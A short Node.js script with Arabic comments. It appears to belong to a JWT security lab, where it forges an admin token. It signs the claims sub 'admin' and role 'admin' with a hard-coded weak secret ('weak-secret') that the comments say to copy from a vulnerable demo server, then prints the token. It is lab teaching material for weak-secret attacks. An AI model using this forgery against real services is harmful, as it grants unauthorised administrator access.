// forge.js
// usage: node forge.js
const jwt = require('jsonwebtoken');

// اكتب هنا السر الضعيف الموجود في vuln-server.js
const WEAK_SECRET = 'weak-secret'; // <-- عدّله لو ملفك فيه قيمة تانية

const token = jwt.sign(
  { sub: 'admin', role: 'admin' },
  WEAK_SECRET,
  { algorithm: 'HS256', expiresIn: '7d', issuer: 'jwt-lab' } // نفس الـclaims اللي يحتاجها vuln-demo
);

console.log(token);
